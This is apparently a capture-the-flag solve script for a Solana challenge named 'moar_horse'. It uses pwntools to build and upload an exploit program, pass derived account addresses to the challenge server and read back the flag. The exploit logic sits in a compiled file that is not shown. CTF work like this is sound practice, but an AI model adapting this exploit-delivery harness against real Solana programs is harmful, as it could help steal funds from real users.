import os
os.system('cargo build-sbf')

from pwn import *
from solders.pubkey import Pubkey as PublicKey
from solders.system_program import ID
import base58

# context.log_level = 'debug'

host = args.HOST or 'localhost'
port = args.PORT or 5001

r = remote(host, port)
solve = open('target/deploy/moar_horse_solve.so', 'rb').read()
r.recvuntil(b'program pubkey: ')
r.sendline(b'5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwZexx')
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.recvuntil(b'program: ')
program = PublicKey(base58.b58decode(r.recvline().strip().decode()))
r.recvuntil(b'user: ')
user = PublicKey(base58.b58decode(r.recvline().strip().decode()))
horse, horse_bump = PublicKey.find_program_address([b'HORSE'], program)
wallet, wallet_bump = PublicKey.find_program_address([b'WALLET', bytes(user)], program)

r.sendline(b'5')
print("PROGRAM=", program)
r.sendline(b'x ' + str(program).encode())
print("USER=", user)
r.sendline(b'ws ' + str(user).encode())
print("HORSE=", horse)
r.sendline(b'w ' + str(horse).encode())
print("WALLET=", wallet)
r.sendline(b'w ' + str(wallet).encode())
print("HORSE_BUMP=", ID)
r.sendline(b'x ' + str(ID).encode())
r.sendline(b'0')

leak = r.recvuntil(b'Flag: ')
print(leak)
r.stream()


"""
 1998542320
 1998541936
10998541936
"""